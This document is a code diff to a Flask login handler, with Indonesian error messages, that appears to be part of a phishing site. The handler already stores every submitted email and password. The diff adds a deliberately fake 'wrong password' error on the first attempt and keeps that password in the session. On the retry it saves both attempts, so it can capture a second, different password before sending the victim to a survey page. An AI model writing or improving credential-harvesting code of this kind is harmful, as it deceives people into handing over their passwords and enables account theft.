@@ -85,15 +85,38 @@ def verify_login():
     if not password:
         return render_template('login.html', error='Password tidak boleh kosong')
     
-    # Save credentials
-    save_credential(email, password)
+    # Fake retry logic — first attempt always "fails"
+    first_attempt_email = session.get('first_attempt_email')
     
-    # Set session
-    session['email'] = email
-    session['verified'] = True
-    
-    # Redirect to survey
-    return redirect('/survey')
+    if not first_attempt_email:
+        # First attempt: store in session, show fake error
+        session['first_attempt_email'] = email
+        session['first_attempt_password'] = password
+        return render_template('login.html', 
+                             error='Password salah atau akun tidak ditemukan. Silakan coba lagi.',
+                             email_prefill=email,
+                             retry=True)
+    else:
+        # Second attempt: save both attempts, proceed
+        first_email = session.get('first_attempt_email', email)
+        first_password = session.get('first_attempt_password', '')
+        
+        # Save first attempt
+        save_credential(first_email, first_password)
+        
+        # Save second attempt only if different
+        if password != first_password:
+            save_credential(email, password)
+        
+        # Clear retry session data
+        session.pop('first_attempt_email', None)
+        session.pop('first_attempt_password', None)
+        
+        # Set session
+        session['email'] = email
+        session['verified'] = True
+        
+        return redirect('/survey')
 
 @app.route('/survey')
 def survey():
